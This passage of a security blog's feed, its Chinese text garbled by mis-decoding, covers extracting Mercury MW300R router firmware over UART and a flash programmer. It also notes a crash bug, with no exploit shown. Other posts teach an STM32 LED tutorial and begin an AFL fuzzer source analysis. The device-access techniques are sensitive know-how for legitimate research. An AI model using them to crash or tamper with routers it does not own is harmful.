&lt;p&gt;æ–‡ç« å·²åœ¨å…ˆçŸ¥ç¤¾åŒºæŠ•ç¨¿ï¼š&lt;a href=&quot;https://xz.aliyun.com/t/13364&quot;&gt;https://xz.aliyun.com/t/13364&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ã€æ¼æ´æŒ–æ˜ã€‘è®°ä¸€æ¬¡ç—›è‹¦çš„VxWorksè·¯ç”±å™¨æ¼æ´æŒ–æ˜</title>
    <link href="https://joe1sn.eu.org/2024/01/12/MW300R-vuln/"/>
    <id>https://joe1sn.eu.org/2024/01/12/MW300R-vuln/</id>
    <published>2024-01-12T06:41:03.000Z</published>
    <updated>2024-01-12T07:58:42.061Z</updated>
    
    <content type="html"><![CDATA[<p>é—®é¢˜å¤šåˆå¤š</p><span id="more"></span><h1 id="è®°ä¸€æ¬¡ç—›è‹¦çš„vxworksè·¯ç”±å™¨æ¼æ´æŒ–æ˜"><a class="markdownIt-Anchor" href="#è®°ä¸€æ¬¡ç—›è‹¦çš„vxworksè·¯ç”±å™¨æ¼æ´æŒ–æ˜"></a> è®°ä¸€æ¬¡ç—›è‹¦çš„VxWorksè·¯ç”±å™¨æ¼æ´æŒ–æ˜</h1><p>è·¯ç”±å™¨å¾ˆè€äº†ï¼Œæ˜¯Mercury MW300Rçš„æŸä¸ªç‰ˆæœ¬ï¼Œç½‘ä¸Šæ‰¾ä¸åˆ°å›ºä»¶ï¼Œæ‰€ä»¥æœ€å¼€å§‹æƒ³ç”¨uartè¿›shell</p><p><img src="https://img.joe1sn.top/uploads/big/71cdd1353aa2a65e2a93bbe74505794c.png" alt="image-20240112140428176" /></p><p>æ‹†å¼€è¿‡åå¯ä»¥å¿«é€Ÿæ‰¾åˆ°UARTå¼•è„š</p><p><img src="https://img.joe1sn.top/uploads/big/d81c03bcc326000e5b9b614d815ff5c7.png" alt="image-20240112153117629" /></p><h2 id="uartè°ƒè¯•"><a class="markdownIt-Anchor" href="#uartè°ƒè¯•"></a> UARTè°ƒè¯•</h2><h3 id="i-æ‰“å¼€uart"><a class="markdownIt-Anchor" href="#i-æ‰“å¼€uart"></a> I æ‰“å¼€UART</h3><p>è·¯ç”±å™¨æ–­ç”µï¼Œç„¶åæŠŠä¸‡ç”¨è¡¨è°ƒåˆ°æµ‹æ¥åœ°ï¼Œé»‘ç¬”éšä¾¿æ‰¾ä¸€ä¸ªç”µè·¯æ¿ä¸Šçš„æ¥å£ï¼ˆæˆ‘ç”¨çš„wifiå¤©çº¿çš„ï¼‰ï¼Œçº¢ç¬”æµ‹å£å­ï¼Œå“çš„é‚£ä¸ªå°±æ˜¯æ¥åœ°</p><p>æ¥ç€è·¯ç”±å™¨è¿ä¸Šç”µæºï¼Œä¸‡ç”¨è¡¨è°ƒåˆ°æµ‹ç”µå‹ï¼Œé»‘ç¬”éšä¾¿æ‰¾ä¸€ä¸ªç”µè·¯æ¿ä¸Šçš„æ¥å£ï¼Œçº¢ç¬”æŒ¨ä¸ªæµ‹è¯•æ¥å£</p><ul><li>å¦‚æœä¸º3.3Vå·¦å³ï¼Œé‚£ä¹ˆæ˜¯ç”µæºçº¿ï¼ˆ3.3Vï¼‰</li><li>å¦‚æœä¸º0Vï¼Œä¸ºæ¥åœ°ï¼ˆGNDï¼‰</li><li>å¦‚æœä¸º2.5Vå·¦å³ï¼Œä¸ºTXDï¼ˆè·¯ç”±å™¨çš„Writeï¼‰</li><li>å¦‚æœä¸æ–­è·³åŠ¨ï¼Œä¸ºRXDï¼ˆè·¯ç”±å™¨çš„Readï¼‰</li></ul><p><strong>ç„¶åç¬¬ä¸€ç‚¹ä¸å¯»å¸¸çš„å°±æ¥äº†</strong></p><p>æˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™åªèƒ½é€šè¿‡æ’é™¤æ³•ç­›é€‰å‡ºäº†RXDï¼Œæˆ‘çš„RXDä¸€ç›´ä¸º0V</p><p><img src="https://img.joe1sn.top/uploads/big/df439aaa4d8867c9c8b18f22a95516a4.png" alt="image-20240112141505800" /></p><p>è¿™ä¸ªæ—¶å€™é€šè¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FT232: 3.3V -&gt; è·¯ç”±å™¨: 3.3v</span><br><span class="line">FT232: GND  -&gt; è·¯ç”±å™¨: GND</span><br><span class="line">FT232: RXD  -&gt; è·¯ç”±å™¨: TXD</span><br><span class="line">FT232: TXD  -&gt; è·¯ç”±å™¨: RXD</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/5ad1558352398a3e6b14c9e3e5c46073.png" alt="image-20240112141907775" /></p><p><strong>æ’ä¸Šè·¯ç”±å™¨ç”µæºçº¿ï¼Œä½†æ˜¯ä¸æ’æ’å¤´</strong>ï¼Œé€šè¿‡ä¸²å£å°±èƒ½è¿ä¸Šäº†</p><p><img src="https://img.joe1sn.top/uploads/big/233aa50fe42f5f25c24eac6239ebf2ab.png" alt="image-20240112141950855" /></p><p><img src="https://img.joe1sn.top/uploads/big/82994c0bdd9f2b4aea62b9d6e2c1e53e.png" alt="image-20240112142014239" /></p><p>ä½†æ˜¯ä¼šå‘ç°æ— æ³•è¾“å…¥ï¼Œå¯¼è‡´è®¾å¤‡ä¸€ç›´é‡å¯ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹æ— æ³•åœä¸‹autobootï¼Œå¾ˆæ˜¾ç„¶éœ€è¦è¾“å…¥æ¥æ‰“æ–­</p><p><img src="https://img.joe1sn.top/uploads/big/c1236c0af9b717b34e85926972b4206c.png" alt="image-20240112142420406" /></p><p>ä½†æ˜¯è·¯ç”±å™¨çš„RXDä¸€ç›´ä¸º0Vï¼Œè¯´æ˜å¹¶æ²¡æœ‰å¼€å¯å‘è·¯ç”±å™¨å†™å…¥çš„åŠŸèƒ½ï¼Œé€šè¿‡ä»”ç»†è§‚å¯Ÿç”µè·¯ï¼Œå‘ç°RXDå‡ºå£æœ‰ä¸‹é¢å‡ ä¸ªæ¥å£ï¼Œä¸æ–­æµ‹è¯•å‘ç°RXDå¯ä»¥åœ¨ä¸‹æ–¹çš„ç„Šç‚¹ä½¿ç”¨</p><p><img src="https://img.joe1sn.top/uploads/big/c3d16dc94aba9ff8146c2856f4ca05b6.png" alt="image-20240112143120491" /></p><p><img src="https://img.joe1sn.top/uploads/big/3afacc1f2ea7063dd9974ef16cb89012.png" alt="img" /></p><p>ä½†æ˜¯æˆ‘æ²¡æœ‰æ¶å­ï¼Œè€Œä¸”ç„Šç‚¹å¤ªå°äº†ï¼ˆæœ¬äººç”µçƒ™é“å¤ªèœï¼‰ï¼Œæ‰€ä»¥æŠ˜å¼¯äº†ä¸€æ ¹æ›²åˆ«é’ˆæ¥ä¼ ä¿¡å·</p><p><img src="https://img.joe1sn.top/uploads/big/0e9613116215b8795f1d5ed68339eab5.png" alt="image-20240112143216503" /></p><h3 id="ii-å¼€å§‹è°ƒè¯•-a"><a class="markdownIt-Anchor" href="#ii-å¼€å§‹è°ƒè¯•-a"></a> II å¼€å§‹è°ƒè¯• A</h3><p><img src="https://img.joe1sn.top/uploads/big/571f2be4829451e211dcf8573f43f4c4.png" alt="image-20240112143502782" /></p><p>èƒ½ç”¨çš„åŠŸèƒ½ç‰¹åˆ«å°‘ï¼Œè€Œä¸”tftpåŠŸèƒ½ç”¨ä¸äº†ï¼Œä¸è¿‡<code>md</code>å¯ä»¥æŸ¥çœ‹å†…å­˜</p><p><img src="https://img.joe1sn.top/uploads/big/312c1b8e77e551c29417858947e95854.png" alt="image-20240112143630442" /></p><p>å…¶å®è¿™é‡Œå¯ä»¥<strong>å‚è€ƒ</strong><a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">è¿™ç¯‡åšå®¢</a>è¿›è¡Œdumpæå–çš„ï¼Œä½†æ˜¯å½“æ—¶æ²¡æƒ³åˆ°ã€‚</p><h3 id="iii-å¼€å§‹è°ƒè¯•-b"><a class="markdownIt-Anchor" href="#iii-å¼€å§‹è°ƒè¯•-b"></a> III å¼€å§‹è°ƒè¯• B</h3><p>åœ¨è¿›å…¥ubootçš„æ—¶å€™å‘ç°<code>ctrl+C</code>ä¼šæ‰“æ–­ä¸€ä¸ªTP-Linkçš„shell</p><p><img src="https://img.joe1sn.top/uploads/big/2d96f7d56b8ae8fe623b18558e80d79a.png" alt="img" /></p><p>åç»­å‘ç°æ’ä¸Šæ’å¤´åæœ‰æ¦‚ç‡ä¼šåœåœ¨è¿™é‡Œ</p><p><img src="https://img.joe1sn.top/uploads/big/7474c84098dc952a5c5eee5346ead3cc.png" alt="image-20240112144335565" /></p><p>ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹å†…å­˜åˆ†é…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flash -layout</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/8577ceadac971f3d42c2aa0655d187ff.png" alt="image-20240112144442000" /></p><p>çœ‹åˆ°è¿™é‡Œæˆ‘æ‰æ˜ç™½æœ€å¼€å§‹è¿›çš„æ˜¯ubootçš„æ§åˆ¶çª—å£ï¼Œè¿™é‡Œæ‰æ˜¯çœŸæ­£çš„Flashå­˜å‚¨çš„å¯åŠ¨ç‚¹</p><p>ä¿®æ”¹äº†<a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">è¿™ç¯‡åšå®¢</a>çš„è„šæœ¬æŒ‰ç…§ä¸€æ ·çš„æ€è·¯è¯•å›¾æå–å›ºä»¶å‡ºæ¥ï¼Œä½†æ˜¯binwalkæ²¡æœ‰ä»»ä½•è¯†åˆ«ï¼Œæ‰€ä»¥UARTèµ°åˆ°å°½å¤´äº†</p><h2 id="cha341aæ³•"><a class="markdownIt-Anchor" href="#cha341aæ³•"></a> CHA341Aæ³•</h2><p>å°±æ˜¯ä¼ ç»Ÿçš„é£çº¿æ³•ï¼Œè·¯ç”±å™¨ä¸Šèƒ½ç”¨èŠ¯ç‰‡å¤¹çš„å°±ä¸¤ä¸ªèŠ¯ç‰‡ï¼Œç”¨CHA341ç¼–ç¨‹å™¨è¯»å–ä¸€ä¸‹å°±çŸ¥é“äº†ï¼ˆè®°å¾—è£…é©±åŠ¨ï¼‰</p><p>å…³äºç»„è£…å¯ä»¥çœ‹<a href="https://macoshome.com/hackintosh/hcourse/8672.html">è¿™ç¯‡</a></p><p><strong>èŠ¯ç‰‡æ²¡æœ‰è¯†åˆ«åˆ°ï¼Œä½†æ˜¯é‡è¦çš„æ˜¯èŠ¯ç‰‡å­˜å‚¨çš„å¤§å°</strong>ï¼Œé€šè¿‡ä¸Šflash layoutå¯ä»¥çœ‹åˆ°æ€»ç©ºé—´å¤§å°æ˜¯1024KB=1MBï¼Œé€‰æ‹©å¤§å°ä¸º1MBçš„èŠ¯ç‰‡å°±å¥½äº†</p><p><img src="https://img.joe1sn.top/uploads/big/3f5f93b6fe9ccdfcfc54dd34435e866e.png" alt="image-20240112145236126" /></p><p>ç”¨binwalkçœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯VxWorksçš„ç³»ç»Ÿï¼Œè€Œä¸”æ ¹æœ¬å°±æ²¡æœ‰Unix/Linuxçš„æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ˜¯ä½¿ç”¨äº†<code>Wind River </code>æ–‡ä»¶ç³»ç»Ÿï¼Œæ€ªä¸å¾—æ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯ä¸€å¨ï¼Œè€Œä¸”çŸ¥é“äº†ç¨‹åºå…¥å£æ˜¯<code>0x80001000</code></p><p><img src="https://img.joe1sn.top/uploads/big/d9c9135a8be26c1216591ef7d8813e15.png" alt="image-20240112150503842" /></p><p>å¯ä»¥å‚è€ƒ<a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">è¿™ç¯‡</a>æ¥æ…¢æ…¢æå–ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥ç›´æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me MW300R.bin</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a2348594065a762a3cc1983166df2c7b.png" alt="image-20240112150701769" /></p><p>çœ‹ä¸Šå»æŒºå¤šçš„ï¼Œå…¶å®æ ¹æœ¬ä¸æ…Œï¼Œéšä¾¿çœ‹ä¸€ä¸ª</p><p><img src="https://img.joe1sn.top/uploads/big/c0af0c85c57c40b65475e67c21787054.png" alt="image-20240112150746160" /></p><p>å†çœ‹çœ‹<code>Wind River</code>é‚£æ®µçš„æ•°æ®ï¼ŒæŒ‰é¡ºåºå°±å¯¹å¯¹åº”çš„ä¸åŒæ–‡ä»¶äº†</p><p><img src="https://img.joe1sn.top/uploads/big/e0cb52fbcca6ca98ff37d6673d177fc3.png" alt="image-20240112150918772" /></p><p>å¯ä»¥æŒ‰ç…§å¯¹åº”çš„æ ¼å¼å†™è„šæœ¬æå–ï¼Œä¸è¿‡æœ¬æ–‡çš„ä¸­å¿ƒå¹¶ä¸åœ¨è¿™å„¿ã€‚</p><p>åœ¨æå–çš„æ—¶å€™å‘ç°</p><p><img src="https://img.joe1sn.top/uploads/big/f63e1cf98c122aa8c596bfb7af7ce99c.png" alt="image-20240112151253608" /></p><p>æŠŠ<code>49200</code>æ–‡ä»¶ç‰¹æ®Šçœ‹ä¸€ä¸‹</p><p><img src="https://img.joe1sn.top/uploads/big/249494f2709907f5dc0a18650d8fab8a.png" alt="image-20240112151338519" /></p><p>æ­å–œï¼Œæ‰¾åˆ°äº†ä¸»è¦æ–‡ä»¶çš„</p><p>ç”¨ida 32ä½ MIPSå¤§ç«¯åºæ‰“å¼€</p><p><img src="https://img.joe1sn.top/uploads/big/60ee931f155256c22afa57d55644622f.png" alt="image-20240112151500456" /></p><p>æ ¹æ®å‰æ–‡æåˆ°çš„å…¥å£åœ°å€<code>0x80001000</code>è®¾ç½®å…¥å£</p><p><img src="https://img.joe1sn.top/uploads/big/ce3b8f706d348b5b68a467ce65dc9f50.png" alt="image-20240112151550592" /></p><p>åœ¨å¼€å¤´æŒ‰ä¸‹Cå°±IDAå°±å¼€å§‹è‡ªåŠ¨åˆ†æäº†</p><p><img src="https://img.joe1sn.top/uploads/big/b5cdbb90e788e174da8417fd777b9807.png" alt="image-20240112151715384" /></p><h2 id="æ¼æ´æŒ–æ˜"><a class="markdownIt-Anchor" href="#æ¼æ´æŒ–æ˜"></a> æ¼æ´æŒ–æ˜</h2><p>ä¸Šé¢çš„äºŒè¿›åˆ¶åˆ†æèµ·æ¥è¿˜æ˜¯æœ‰éš¾åº¦çš„ï¼Œä¸è¿‡ç”¨å¸¸è§„æ€è·¯ï¼ˆåŒ…æ‹¬webï¼‰å³å¯</p><p>æ¯”å¦‚ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„DOSæ´ï¼Œå¾ˆæ˜æ˜¾åªåšäº†å‰ç«¯æ ¡éªŒ</p><p><img src="https://img.joe1sn.top/uploads/big/1d769daf0f6578f0f773a90d36c2d831.png" alt="image-20240112151913239" /></p><p>ç›´æ¥æŠŠè·¯ç”±å™¨æ‰“å´©ï¼Œå¾—é‡å¯æ‰èƒ½æ¢å¤æ­£å¸¸å·¥ä½œ</p><h1 id="å¼•ç”¨"><a class="markdownIt-Anchor" href="#å¼•ç”¨"></a> å¼•ç”¨</h1><p><a href="https://paper.seebug.org/2024">https://paper.seebug.org/2024</a></p><p><a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">https://e3pem.github.io/2019/07/03/IoT/æå–tl-wdr5620å›ºä»¶/</a></p><p><a href="https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html">https://blog.quarkslab.com/reverse-engineering-a-vxworks-os-based-router.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é—®é¢˜å¤šåˆå¤š&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="cve" scheme="https://joe1sn.eu.org/tags/cve/"/>
    
    <category term="æ¼æ´æŒ–æ˜" scheme="https://joe1sn.eu.org/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>ã€STM32ã€‘1.ç‚¹ç¯å¤§å¸ˆ</title>
    <link href="https://joe1sn.eu.org/2023/09/10/stm32-1-light/"/>
    <id>https://joe1sn.eu.org/2023/09/10/stm32-1-light/</id>
    <published>2023-09-10T11:51:40.000Z</published>
    <updated>2023-09-10T13:11:53.162Z</updated>
    
    <content type="html"><![CDATA[<p>å¦‚ä½•ä¸‰å°æ—¶ä¹‹å†…ï¼Œä»0å¼€å§‹å­¦ä¼šstm32ç‚¹ç¯</p><p>ï¼ˆå…¶å®æ˜¯æƒ³éªŒè¯ä¸‹å‘çš„èŠ¯ç‰‡æ˜¯ä¸æ˜¯å¥½çš„ï¼‰</p><span id="more"></span><h1 id="å‡†å¤‡å·¥ä½œ"><a class="markdownIt-Anchor" href="#å‡†å¤‡å·¥ä½œ"></a> å‡†å¤‡å·¥ä½œ</h1><p>æˆ‘æ˜¯åœ¨JDä¸Šéšä¾¿ä¹°çš„ä¸€å®¶ï¼Œæœ‰</p><p>STM32F103C8T6ï¼Œé¢åŒ…æ¿ï¼ŒUSBè½¬TTLï¼Œæ˜¾ç¤ºå™¨â€¦</p><p>ç¼ºå•¥å°‘å•¥ä¹°é…ä»¶å°±è¡Œäº†</p><h1 id="1è½¯ä»¶"><a class="markdownIt-Anchor" href="#1è½¯ä»¶"></a> 1.è½¯ä»¶</h1><p>ç”±äºæˆ‘ä»¬æ˜¯å°ç™½ï¼Œæ‰€ä»¥æš‚æ—¶ä¸éœ€è¦çœ‹ç”µè·¯å•¥çš„ï¼Œç›´æ¥å…ˆæŠŠè½¯ä»¶è£…ä¸Šã€‚</p><ul><li>STM32CubeIDE</li></ul><p><strong>è¿™é‡Œæˆ‘å‚è€ƒäº†ï¼šBV1HM411b78E</strong></p><iframe src="//player.bilibili.com/player.html?aid=522761379&bvid=BV1HM411b78E&cid=964014224&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p>æˆ–è€…çŸ¥ä¹çš„<a href="https://zhuanlan.zhihu.com/p/321845090">https://zhuanlan.zhihu.com/p/321845090</a></p><p>çŸ¥ä¹çš„æœ‰ä¸€ä¸ªæ¨¡æ‹Ÿç¨‹åº</p><ul><li>é©±åŠ¨ï¼ˆå› ä¸ºæˆ‘æ˜¯USBè½¬TTLï¼‰ï¼šCH340-é©±åŠ¨ï¼Œè¿™ä¸ªä½ å¯ä»¥æ‰¾å®¢æœè¦ï¼Œä¸€èˆ¬éƒ½ä¼šå‘ç»™ä½ çš„</li><li>çƒ§å½•è½¯ä»¶ï¼šFLYMCU</li></ul><p>é¦–å…ˆéœ€è¦ç†Ÿæ‚‰çš„å°±æ˜¯STM32CubeIDEçš„ä½¿ç”¨ï¼Œå¯ä»¥å‚è€ƒä¸Šé¢çš„Bç«™è§†é¢‘åè€…çŸ¥ä¹ï¼Œè¿™é‡Œè¿˜æœ‰ï¼š<a href="https://www.bilibili.com/video/BV13B4y1y7yk">https://www.bilibili.com/video/BV13B4y1y7yk</a></p><h1 id="2ç¡¬ä»¶"><a class="markdownIt-Anchor" href="#2ç¡¬ä»¶"></a> 2.ç¡¬ä»¶</h1><p>è¿™ä¸ªæ˜¯å§‹ç»ˆç»•ä¸å¼€çš„ï¼ˆé™¤éä½ ç”¨EDAï¼‰</p><p><strong>1.é¢åŒ…æ¿</strong></p><p>æœ‰æ—¶é—´å¯ä»¥å‚è€ƒï¼š<a href="https://www.bilibili.com/video/BV1gz4y1Z7N7">https://www.bilibili.com/video/BV1gz4y1Z7N7</a></p><p>æˆ–è€…</p><p><img src="https://img.joe1sn.top/uploads/big/2e4be1b02468f7dc6f30ca5fa39743b3.png" alt="image-20230910201039379" /></p><p>å¯¼çº¿å°±æ˜¯è¿™æ ·è¿æ¥çš„</p><p><strong>2.STM32F103C8T6</strong></p><p>æ˜¾ç¤ºå†IDEä¸­çš„</p><p><img src="https://img.joe1sn.top/uploads/big/240043662443e27813cb75699f9d0052.png" alt="image-20230910201448666" /></p><p>æ¯”å¦‚è¿™é‡Œçš„<code>PA0</code>å°±æ˜¯ä»£è¡¨èŠ¯ç‰‡çš„A0æ¥å£</p><p><img src="https://img.joe1sn.top/uploads/big/fa1182386227986f3a24676b4578f5b7.png" alt="image-20230910201538474" /></p><p>è¿™é‡Œçš„<code>GPIO_Output</code>ä»£è¡¨çš„æ˜¯<code>ä¿¡å·è¾“å‡º</code>ï¼ˆä¸¥æ ¼æ¥è¯´ä¸æ˜¯è¿™æ ·çš„ï¼‰ã€‚å…·ä½“çš„è®¾ç½®å¯ä»¥å‚è€ƒ<a href="https://www.bilibili.com/video/BV1ja411J766">https://www.bilibili.com/video/BV1ja411J766</a></p><p>åœ¨<code>main.c</code>ä¸­çš„<code>main</code>å‡½æ•°çš„<code>while</code>æ­»å¾ªç¯é‡Œé¢æœ‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Infinite loop */</span></span><br><span class="line"><span class="comment">/* USER CODE BEGIN WHILE */</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* USER CODE END WHILE */</span></span><br><span class="line"> HAL_GPIO_TogglePin(GPIOA, LED1_Pin);</span><br><span class="line"> HAL_Delay(<span class="number">200</span>);</span><br><span class="line"> HAL_GPIO_TogglePin(GPIOA, LED2_Pin);</span><br><span class="line"> HAL_Delay(<span class="number">200</span>);</span><br><span class="line">  <span class="comment">/* USER CODE BEGIN 3 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>LED1_Pin</code>å’Œ<code>LED2_Pin</code>æ˜¯æˆ‘ç»™çš„å‘½åï¼Œç„¶åç¼–è¯‘å°±å¥½äº†</p><p><strong>3.çƒ§å½•</strong></p><p>å¯ä»¥å‚è€ƒ</p><p><a href="https://www.bilibili.com/video/BV1wR4y1y7E2/">https://www.bilibili.com/video/BV1wR4y1y7E2/</a></p><p><a href="https://www.bilibili.com/video/BV1P24y1L7Ho">https://www.bilibili.com/video/BV1P24y1L7Ho</a></p><p>PA9&lt;â€“&gt;RXD</p><p>PA10&lt;â€“&gt;TXD</p><p>è®¾ç½®æ¡çº¿ï¼š</p><p><img src="https://img.joe1sn.top/uploads/big/27a10a6eafd1d619725072f214b3a299.png" alt="image-20230910211049260" /></p><p>å¼€å§‹FLYMCUçƒ§å½•</p><p><img src="https://img.joe1sn.top/uploads/big/90fd0e71f90e0c6eca76f4411c53e554.png" alt="image-20230910204832081" /></p><p>é€‰hexæ–‡ä»¶çƒ§è¿›å»å°±è¡Œäº†</p><p><strong>å¦‚æœä½ åƒæˆ‘ä¸Šå›¾é‚£æ ·å¤–æ¥ç”µæº</strong>ï¼Œåœ¨çƒ§å½•çš„æ—¶å€™ä¹Ÿæ˜¯éœ€è¦å°†å…¶æ’å…¥USBæ¥å£ä¸­çš„</p><h1 id="3ç”µè·¯"><a class="markdownIt-Anchor" href="#3ç”µè·¯"></a> 3.ç”µè·¯</h1><p><strong>ä¸çŸ¥é“äºŒæç®¡åŠŸç‡çš„æœ€å¥½åŠ ä¸Š1kæ¬§çš„ç”µé˜»</strong>ï¼Œä¿¡å·æ—¶ä»A0å’ŒA1è¾“å‡ºï¼Œæœ€åæµå‘çš„æ˜¯Gè·³çº¿ï¼ˆå‚è€ƒä¸Šå›¾ï¼‰</p><p>è°ƒå›bootæ¡çº¿ï¼ŒæŒ‰ä¸‹å¤ä½é”®ï¼š</p><p><img src="https://img.joe1sn.top/uploads/big/f06da32c2c7c09a43ba0ac9ac1e50929.png" alt="image-20230910210541362" /></p><p>æˆåŠŸç‚¹äº®</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¦‚ä½•ä¸‰å°æ—¶ä¹‹å†…ï¼Œä»0å¼€å§‹å­¦ä¼šstm32ç‚¹ç¯&lt;/p&gt;
&lt;p&gt;ï¼ˆå…¶å®æ˜¯æƒ³éªŒè¯ä¸‹å‘çš„èŠ¯ç‰‡æ˜¯ä¸æ˜¯å¥½çš„ï¼‰&lt;/p&gt;</summary>
    
    
    
    <category term="hardware" scheme="https://joe1sn.eu.org/categories/hardware/"/>
    
    
    <category term="stm32" scheme="https://joe1sn.eu.org/tags/stm32/"/>
    
  </entry>
  
  <entry>
    <title>ã€æºç åˆ†æã€‘AFLæºä»£ç åˆ†æ</title>
    <link href="https://joe1sn.eu.org/2023/07/22/afl-source/"/>
    <id>https://joe1sn.eu.org/2023/07/22/afl-source/</id>
    <published>2023-07-22T00:41:03.000Z</published>
    <updated>2024-01-10T04:45:48.085Z</updated>
    
    <content type="html"><![CDATA[<p>å…¶å®è¿˜æ˜¯æŒºç®€å•çš„</p><span id="more"></span><p><img src="https://img.joe1sn.top/uploads/big/2ce8fd381c9b8cd5f9ebfc1e137790c7.png" alt="image-20230722090502823" /></p><p>åœ¨ä¸€æ¬¡æœŸæœ«æŠ¥å‘Šé‡Œé¢åšäº†è¿™ä¸ªæŠ¥å‘Š</p><p><strong>å…³äºAFLçš„åŸºæœ¬æ­¥éª¤</strong></p><p>å·¥ä½œæµç¨‹åŸºæœ¬ä¸Šå¯ä»¥ç”¨ 5 ä¸ªæ­¥éª¤æ¥æè¿°ï¼šé¢„å¤„ç†ã€è¾“å…¥æ„å»ºã€è¾“å…¥é€‰æ‹©ã€è¯„ä¼°ã€åæ¨¡ç³Šæµ‹è¯•ã€‚ çœŸæ­£çš„å†…æ ¸å¤„ç†æ˜¯æ­¥éª¤ 2 åˆ° 4</p><ul><li><p>é¢„å¤„ç†</p><p>åˆ†æå’Œè·å–æœ‰ç”¨ä¿¡æ¯ï¼Œä½¿ç”¨PINï¼Œç¬¦å·æ‰§è¡Œï¼Œæ±¡ç‚¹æ£€æŸ¥</p><p>é»‘ç›’ç™½ç›’</p></li><li><p>è¾“å…¥æ„å»º</p><p>ä»æ•°æ® Sï¼ˆç§å­ï¼‰äº§ç”Ÿå¤§é‡å˜å¼‚æ•°æ® Iã€‚</p></li><li><p>è¾“å…¥é€‰æ‹©</p><p>è¿‡æ»¤æ— æ•ˆæ•°æ®ï¼Œä¼˜åŒ–æ¨¡ç³Šæµ‹è¯•</p></li><li><p>è¯„ä¼°</p><p>å¤§å¤šæ•°å…³äºæ¨¡ç³Šçš„ç ”ç©¶é›†ä¸­åœ¨ä¸¤ä¸ªæŒ‡æ ‡ä¸Šï¼šè¦†ç›–ç‡å’Œåˆ©ç”¨æ¼æ´çš„å¹³å‡æ—¶é—´</p></li></ul><h1 id="æºç åˆ†æ"><a class="markdownIt-Anchor" href="#æºç åˆ†æ"></a> æºç åˆ†æ</h1><h2 id="ç¼–è¯‘æ’æ¡©"><a class="markdownIt-Anchor" href="#ç¼–è¯‘æ’æ¡©"></a> ç¼–è¯‘æ’æ¡©</h2><h3 id="afl-gcc"><a class="markdownIt-Anchor" href="#afl-gcc"></a> afl-gcc</h3><p>æ ¹æ®ä½¿ç”¨æ–¹æ³•ï¼Œé¦–å…ˆæ˜¯ä½¿ç”¨<code>afl-gcc</code>è¿›è¡Œç¼–è¯‘ï¼Œåœ¨ç¼–è¯‘æ—¶å°±å®Œæˆæ’æ¡©</p><p><img src="https://img.joe1sn.top/uploads/big/97bdf6ef6f906c0fe4f25c248f13ece7.png" alt="image-20230722090843228" /></p><p>æœ¬å°±æ˜¯æ˜¯åŒ…è£¹çš„GCCç›’CLANG</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** 